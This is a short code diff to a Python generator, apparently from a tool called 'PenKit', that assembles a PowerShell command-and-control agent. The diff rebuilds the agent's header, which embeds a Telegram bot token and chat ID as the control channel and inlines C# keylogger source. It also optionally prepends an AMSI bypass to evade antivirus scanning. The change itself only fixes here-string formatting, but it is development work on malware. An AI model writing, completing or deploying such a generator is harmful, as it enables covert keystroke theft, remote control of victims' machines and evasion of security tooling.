@@ -565,15 +565,18 @@ def generate(
 
     bypass = get_inline_bypass() if include_amsi_bypass else ""
 
-    header = textwrap.dedent(f"""
-        # PenKit C2 Agent — Telegram
-        $TG_TOKEN = "{token}"
-        $TG_CHAT  = "{chat_id}"
-        $TG_API   = "https://api.telegram.org/bot$TG_TOKEN"
-        $KL_CS    = @'
-        {_KEYLOGGER_CS.strip()}
-        '@
-    """).strip()
+    # Build header manually — PowerShell here-strings require '@ at column 0,
+    # so we cannot use textwrap.dedent on a block containing embedded C# code.
+    cs_code = _KEYLOGGER_CS.strip()
+    header = (
+        f"# PenKit C2 Agent — Telegram\n"
+        f'$TG_TOKEN = "{token}"\n'
+        f'$TG_CHAT  = "{chat_id}"\n'
+        f'$TG_API   = "https://api.telegram.org/bot$TG_TOKEN"\n'
+        f"$KL_CS    = @'\n"
+        f"{cs_code}\n"
+        f"'@"
+    )
 
     main = _MAIN_LOOP_PS1.replace("{INTERVAL}", str(interval))
 
